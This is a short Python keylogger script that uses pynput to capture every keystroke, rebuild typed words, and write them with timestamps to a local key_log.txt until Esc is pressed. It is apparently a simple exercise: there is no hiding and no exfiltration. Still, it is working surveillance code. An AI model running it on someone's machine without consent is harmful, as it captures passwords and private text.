from pynput.keyboard import Key, Listener
import logging
import os

log_directory = os.getcwd()
log_filename = os.path.join(log_directory, "key_log.txt")
logging.basicConfig(
    filename=log_filename,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

current_word = ''
shift_pressed = False
caps_lock_on = False
final_sentence = ''

# Map keys to their respective characters when the shift key is held down
shift_map = {
    '`': '~', '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
    '6': '^', '7': '&', '8': '*', '9': '(', '0': ')', '-': '_',
    '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', '\'': '"',
    ',': '<', '.': '>', '/': '?'
}

def on_press(key):
    global current_word, shift_pressed, caps_lock_on, final_sentence
    try:
        # Handling alphabetic keys 
        # Considering caps lock and shift key
        logging.info('Key pressed: ' + str(key.char))
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            # Apply shift or caps transformation if necessary
            if shift_pressed and char in shift_map:
                char = shift_map[char]
            elif shift_pressed ^ caps_lock_on and char.isalpha():
                char = char.upper()
            current_word += char
    except AttributeError:
        # Handling special non-alphanumeric keys
        logging.info('Special key pressed: ' + str(key))
        if key == Key.shift_l or key == Key.shift_r:
            shift_pressed = True
        elif key == Key.caps_lock:
            caps_lock_on = not caps_lock_on
        elif key == Key.space or key == Key.enter:
            # Space or Enter
            logging.info(f'Word typed: {current_word}')
            final_sentence += ' '
            final_sentence += current_word
            current_word = ''
        elif key == Key.backspace:
            # Backspace
            logging.info(f'Character deleted: {current_word[:-1]}')
            current_word = current_word[:-1]
        else:
            logging.info(f'Special key pressed: {key}')

def on_release(key):
    global shift_pressed,final_sentence
    if key == Key.shift_l or key == Key.shift_r:
        shift_pressed = False
    if key == Key.esc:
        # Optionally log the current word before stopping if it's not empty
        if current_word:
            logging.info(f'Word typed: {current_word}')
            final_sentence += ' '
            final_sentence += current_word
        logging.info("Stopping logging")
        logging.info(f'Sentence typed: {final_sentence}')
        print("Stop logging")
        return False  # Stop listener

if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()